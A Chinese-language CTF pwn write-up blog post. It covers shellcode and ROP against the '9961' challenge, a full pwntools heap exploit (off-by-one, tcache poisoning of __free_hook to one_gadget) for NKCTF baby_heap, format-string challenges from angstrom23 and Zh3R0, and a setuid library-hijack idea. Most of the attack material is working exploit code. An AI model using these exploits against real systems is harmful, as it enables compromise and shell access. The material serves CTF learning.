<h2 id="9961"><a href="#9961" class="headerlink" title="9961"></a>9961</h2><p>这个目的是xmm寄存器藏东西. 新知识get</p>
<p>但是也可以直接执行, 居然刚好21字节…. cdq的符号拓展(RDX:RAX)可以让edx置为0. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor rsi, rsi</span><br><span class="hljs-string">lea rdi, [r15 + 0xe]</span><br><span class="hljs-string">cdq</span><br><span class="hljs-string">mov ax, 59</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shell = asm(shellcode) + <span class="hljs-string">b&quot;/bin/sh&quot;</span><br></code></pre></div></td></tr></table></figure>

<p>期望是xmm6 leak libc地址.</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">ru(<span class="hljs-string">b&#x27;shellcode!\n\n&#x27;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    movq rsp, xmm6</span><br><span class="hljs-string">    and eax,1</span><br><span class="hljs-string">    and edi, eax</span><br><span class="hljs-string">    push rsp</span><br><span class="hljs-string">    pop rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    xor eax, eax</span><br><span class="hljs-string">    xor edi, edi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>                <br>ss(shellcode)<br>ru(<span class="hljs-string">b&#x27;it!\n&#x27;</span>)<br>leak_addr = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>leak_addr = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) )<br>lg(<span class="hljs-string">&#x27;leak_addr &#x27;</span>, leak_addr)<br><br>libc_base = leak_addr - <span class="hljs-number">0x1f2000</span><br>lg( <span class="hljs-string">&#x27;libc_base&#x27;</span>, libc_base)<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libc_base + <span class="hljs-number">0x2601f</span><br>pop_rdx = libc_base + <span class="hljs-number">0x142c92</span><br>mprotect= libc_base + libc.sym [<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;read &#x27;</span>]<br>binsh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>ret = libc_base + <span class="hljs-number">0x22679</span><br>code = <span class="hljs-number">0x9961000</span><br>pause()<br>payload = p64(pop_rdi)+ p64(binsh) + p64(system_addr)<br>sl(payload)<br></code></pre></div></td></tr></table></figure>

<h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><p><a target="_blank" rel="noopener" href="http://blog.xmcve.com/2023/03/27/NKCTF-2023-Writeup/#title-34">http://blog.xmcve.com/2023/03/27/NKCTF-2023-Writeup/#title-34</a></p>
<p>2.32下的off-by-one</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>file_name = <span class="hljs-string">&#x27;./pwn&#x27;</span><br><br>li = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br>ll = <span class="hljs-keyword">lambda</span> x : <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="hljs-string">&#x27;\x1b[0m&#x27;</span>)<br><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    r = remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn&#x27;</span>, <span class="hljs-number">32892</span>)<br><span class="hljs-keyword">else</span>:<br>    r = process(file_name)<br><br>elf = ELF(file_name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>    gdb.attach(r)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbgg</span>():</span><br>    raw_input()<br><br>menu = <span class="hljs-string">&#x27;Your choice: &#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">index, size</span>):</span><br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Enter the index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    r.sendlineafter(<span class="hljs-string">&#x27;Enter the Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span><br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Enter the index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">index, content</span>):</span><br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Enter the index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    r.sendafter(<span class="hljs-string">&#x27;Enter the content: &#x27;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">index</span>):</span><br>    r.sendlineafter(menu, <span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;Enter the index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>dbgg()<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br><br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x40</span>)<br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">p1 = b&#x27;\x00&#x27; * 0x28 + b&#x27;\x91&#x27;</span><br><span class="hljs-string">edit(0, p1)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x38</span>)<br><br>show(<span class="hljs-number">1</span>)<br>key = u64(r.recv(<span class="hljs-number">5</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>heap_base = key &lt;&lt; <span class="hljs-number">12</span><br>li(<span class="hljs-string">&#x27;heap_base = &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">12</span>):<br>    add(i, <span class="hljs-number">0x88</span>)<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">13</span>, <span class="hljs-number">0x88</span>)<br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">13</span>):<br>    delete(i)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>, <span class="hljs-number">12</span>):<br>    add(i, <span class="hljs-number">0x88</span>)<br><br>show(<span class="hljs-number">11</span>)<br><br>malloc_hook = u64(r.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">368</span> - <span class="hljs-number">0x10</span><br>li(<span class="hljs-string">&#x27;malloc_hook = &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.32.so&#x27;</span>)<br>libc_base = malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>li(<span class="hljs-string">&#x27;free_hook = &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>one = [<span class="hljs-number">0xdf54c</span>, <span class="hljs-number">0xdf54f</span>, <span class="hljs-number">0xdf552</span>]<br>one_gadget = one[<span class="hljs-number">1</span>] + libc_base<br><br>add(<span class="hljs-number">12</span>, <span class="hljs-number">0x88</span>)<br><br>p1 = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x28</span> + <span class="hljs-string">b&#x27;\x91&#x27;</span><br>edit(<span class="hljs-number">0</span>, p1)<br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x88</span>)<br>add(<span class="hljs-number">14</span>, <span class="hljs-number">0x40</span>)<br>delete(<span class="hljs-number">14</span>)<br>delete(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment">#p2 = p64(0) * 7 + p64(0x51) + p64(key ^ free_hook) + p64(0)</span><br>p2 = <span class="hljs-string">b&#x27;b&#x27;</span> * (<span class="hljs-number">8</span> * <span class="hljs-number">7</span>) + p64(<span class="hljs-number">0x51</span>) + p64(key ^ free_hook) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>edit(<span class="hljs-number">1</span>, p2)<br><br>add(<span class="hljs-number">15</span>, <span class="hljs-number">0x40</span>)<br>delete(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">4</span>, p64(one_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="Bytedance"><a href="#Bytedance" class="headerlink" title="Bytedance"></a>Bytedance</h2><p>原题<a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903816031125518#heading-8">https://juejin.cn/post/6844903816031125518#heading-8</a></p>
<p>大致思路是利用malloc_consolidate将fastbin整合进unsortedbin，这样才能利用offbynull，<br><strong>其中的trick在于scanf接收过长字符会临时申请一个largechunk</strong>。</p>
<h1 id="angstorm23"><a href="#angstorm23" class="headerlink" title="angstorm23"></a>angstorm23</h1><h2 id="leek"><a href="#leek" class="headerlink" title="leek"></a>leek</h2><h2 id="noleek"><a href="#noleek" class="headerlink" title="noleek"></a>noleek</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LEEK 32</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">cleanup</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> c)</span> </span>&#123;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    FILE* leeks = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-keyword">if</span> (leeks == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;wtf&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leek? &quot;</span>);<br>    <span class="hljs-keyword">char</span> inp[LEEK];<br>    fgets(inp, LEEK, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">fprintf</span>(leeks, inp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;more leek? &quot;</span>);<br>    fgets(inp, LEEK, <span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">fprintf</span>(leeks, inp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;noleek.\n&quot;</span>);<br>    cleanup(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>相关题目<a target="_blank" rel="noopener" href="https://violenttestpen.github.io/ctf/pwn/2021/06/06/zh3r0-ctf-2021/">链接</a> </p>
<h3 id="Zh3R0-CTF-2021"><a href="#Zh3R0-CTF-2021" class="headerlink" title="Zh3R0 CTF 2021"></a>Zh3R0 CTF 2021</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* gcc -o more-printf -fstack-protector-all more-printf.c */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br>FILE *fp;<br><span class="hljs-keyword">char</span> *buffer;<br><span class="hljs-keyword">uint64_t</span> i = <span class="hljs-number">0x8d9e7e558877</span>;<br><br><span class="hljs-function">_Noreturn <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-comment">/* Just to save some of your time */</span><br>  <span class="hljs-keyword">uint64_t</span> *p;<br>  p = &amp;p;<br><br>  <span class="hljs-comment">/* Chall */</span><br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>);<br>  buffer = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span> + <span class="hljs-number">1</span>);<br>  fp = fopen(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>  fgets(buffer, <span class="hljs-number">0x1f</span>, <span class="hljs-built_in">stdin</span>);<br>  <span class="hljs-keyword">if</span> (i != <span class="hljs-number">0x8d9e7e558877</span>) &#123;<br>    _exit(<span class="hljs-number">1337</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    i = <span class="hljs-number">1337</span>;<br>    <span class="hljs-built_in">fprintf</span>(fp, buffer);<br>    _exit(<span class="hljs-number">1</span>);<br>  &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>



<h2 id="slack"><a href="#slack" class="headerlink" title="slack"></a>slack</h2><p>保护全开. </p>
<p>This C code defines a simple command-line chat program that simulates a conversation with a bot. The program displays messages from the bot, allows the user to input their message, and then displays the messages with timestamps. Here’s a breakdown of the code:</p>
<ol>
<li>Variable declarations, including <code>time_t</code>, <code>struct tm</code>, and character arrays for storing time and messages.</li>
<li>Initialization of the stack canary for security purposes.</li>
<li>Disabling buffering for the standard output and standard input to allow real-time interaction.</li>
<li>Restricting the process’s group permissions.</li>
<li>Printing a welcome message.</li>
<li>Getting the current time and initializing the random number generator.</li>
<li>Main loop (3 iterations) for the chat interaction:<ul>
<li>Getting the current time and formatting it as a string.</li>
<li>Generating a random message from the bot (assuming there’s an array called <code>messages</code>).</li>
<li>Printing the bot’s message with a timestamp.</li>
<li>Prompting the user to enter their message and reading it using <code>fgets</code>.</li>
<li>Formatting and printing the user’s message with a timestamp. <strong>格式化字符串漏洞</strong> </li>
</ul>
</li>
<li>Checking the stack canary before returning from the <code>main</code> function.</li>
</ol>
<p>倒也简单直接, 先leak再覆写stack最后到one_gadget. 要注意的是循环变量i的值. </p>
<p>要修改地址的时候发现输入是有限制的, </p>
<p>研究发现one_gadget要选择第二个. </p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">┌──(root💀kali)-[/mnt/LearingList/CTF/angstorm23/slack]<br>└─<span class="hljs-comment"># one_gadget /lib/x86_64-linux-gnu/libc.so.6                                                                                                                                                                                    </span><br>0xf479a posix_spawn(rsp+0x64, <span class="hljs-string">&quot;/bin/sh&quot;</span>, [rsp+0x38], 0, rsp+0x70, [rsp+0xf0])<br>constraints:<br>  [rsp+0x70] == NULL<br>  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL<br>  [rsp+0x38] == NULL || (s32)[[rsp+0x38]+0x4] &lt;= 0<br><br>0xf47a2 posix_spawn(rsp+0x64, <span class="hljs-string">&quot;/bin/sh&quot;</span>, [rsp+0x38], 0, rsp+0x70, r9)<br>constraints:<br>  [rsp+0x70] == NULL<br>  [r9] == NULL || r9 == NULL<br>  [rsp+0x38] == NULL || (s32)[[rsp+0x38]+0x4] &lt;= 0<br><br>0xf47a7 posix_spawn(rsp+0x64, <span class="hljs-string">&quot;/bin/sh&quot;</span>, rdx, 0, rsp+0x70, r9)<br>constraints:<br>  [rsp+0x70] == NULL<br>  [r9] == NULL || r9 == NULL<br>  rdx == NULL || (s32)[rdx+0x4] &lt;= 0<br></code></pre></div></td></tr></table></figure>







<h1 id="uiuctf-23"><a href="#uiuctf-23" class="headerlink" title="uiuctf 23"></a>uiuctf 23</h1><h2 id="Zapp-setuid-1"><a href="#Zapp-setuid-1" class="headerlink" title="Zapp setuid 1"></a>Zapp setuid 1</h2><ul>
<li>First of all, this is about Zapps -&gt; <a target="_blank" rel="noopener" href="https://zapps.app/technology/">here</a> &lt;-<ul>
<li>In order to make binary depends on library in relative path, Zapps does two things.</li>
<li>First, make libc relative by setting rpath to <code>XORIGIN</code>, and later changing to <code>$ORIGIN</code> to workaround make’s dollar sign excaping</li>
<li>Then, use libshim delivered within Zapp package to act as a jumploader, so that the binary can be loaded by relative pathed ld.so.</li>
</ul>
</li>
<li>Hint: left a CVE opened<ul>
<li>Linux hardlinks will preserve setuid. </li>
<li>Because Virtualbox allows <code>$ORIGIN</code> exists in <code>DT_RPATH</code>, and with setuid, it will do some sanity check on permissons of cwd. But these will happen after the relevant libs’ constructor.</li>
<li>So, with a dedicated constructor, a simple lib can hijack the process to pop a shell before all the checks happen.</li>
</ul>
</li>
<li></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/PWN/">PWN</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
                    
                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
                    
                  </div>
                
              </div>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022-11/CVE-dirtypipe/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">dirtypipe漏洞分析</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022-07/Now-CTF-supplement/">
                        <span class="hidden-mobile">CTF零散的知识点</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="gitalk-container"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#gitalk-container', function() {
      Fluid.utils.createCssLink('/css/gitalk.css')
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', function() {
        var options = Object.assign(
          {"clientID":"312db7ebbc085de5d28d","clientSecret":"85ea3cefd13c73a6d85c1813adfde4f1550bfbda","repo":"yogdzewa.github.io","owner":"yogdzewa","admin":["yogdzewa"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
          {
            id: 'e7cbc29aee2dec9d7993a11e2f15f0d4'
          }
        )
        var gitalk = new Gitalk(options);
        gitalk.render('gitalk-container');
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="https://octodex.github.com/images/jetpacktocat.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;">
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
